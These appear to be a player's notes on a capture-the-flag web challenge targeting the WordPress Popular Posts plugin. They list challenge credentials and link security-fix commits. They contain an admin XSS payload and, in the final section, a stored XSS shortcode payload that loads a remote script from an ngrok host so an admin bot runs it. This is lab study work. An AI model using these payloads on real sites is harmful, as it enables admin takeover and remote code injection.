# Such popular, much wow
> I heard you like web challenges with sourcecode provided. Lets find a simple
> 0-day in an old and vulnerable plugin.  Take a look at the entry-point.sh
> script. You'll find helpful credentials in there.

It's called: diff the patch
Seems relevant to look at that HAH
It says plugin too. So.. what plugin?

- root creds: `admin:UNKNOWN`
- author creds: `bob-the-author:s3cur3PW`

Seems like we might need to create a malicious post and the admin will view it
and we do something fun

https://github.com/cabrerahector/wordpress-popular-posts/archive/refs/tags/4.2.2.zip

https://github.com/cabrerahector/wordpress-popular-posts/compare/4.2.2...5.0.0


5.3.3 (https://github.com/cabrerahector/wordpress-popular-posts/compare/5.3.2...5.3.3)
- Admin XSS Vulnerability: https://github.com/cabrerahector/wordpress-popular-posts/commit/5cde8ff16fb80e23bd881b54f438a8177f7e5ad6
  ```
  Can inject malicious default image to be shown, but need to be admin to upload
  this image. Hmph.

  Modifying POST /wp-admin/options-general.php?page=wordpress-popular-posts&tab=tools
    upload_thumb_src=http%3A%2F%2Flocalhost%3A1024%2Fwp-content%2Fuploads%2F2023%2F08%2F22x" onerror=alert(1) x=".jpeg
  ```
- RCE: https://github.com/cabrerahector/wordpress-popular-posts/commit/d9b274cf6812eb446e4103cb18f69897ec6fe601
  https://www.exploit-db.com/exploits/50129
  https://blog.nintechnet.com/improper-input-validation-fixed-in-wordpress-popular-posts-plugin/

5.3.4 (https://github.com/cabrerahector/wordpress-popular-posts/compare/5.3.3...5.3.4)
- Authenticated Stored XSS that required admin privs
- Other "security" fixes. A variety of escaping here.

5.3.5
- Rolls back some of 5.3.4 changes
- https://github.com/cabrerahector/wordpress-popular-posts/commit/9bc8fc70ad3aad555a5374f0ce66e30fcb99acbc

5.3.6
- Sanitizes something in wpp shortcode. Not sure what was missing.
  https://github.com/cabrerahector/wordpress-popular-posts/commit/3fcb5cc882dfe152871000df968e73535b479a65



## Questions
- What is this firefox script doing?
  It seems to load each post, so loading post has exploit for admin?

WPP Posts shortcode docs:
https://github.com/cabrerahector/wordpress-popular-posts/wiki/2.-Template-tags#parameters



# My vuln:
1. Create post with this excerpt:
   ```
   [wpp excerpt_format=0 excerpt_length=1000 post_html='<li>{title} <img class="wpp-excerpt" src={summary}/></img></li>']
   x" onerror=d=document;s=d.createElement('script');s.src='//88c4-99-61-65-255.ngrok-free.app/exploit.js';document.head.append(s);//

   //jcraige.com/x.jpg" onerror=alert(1)//
   ```
2. Create another and do some reloads for views.
3. Bot will visit
4. How do we takeover admin?
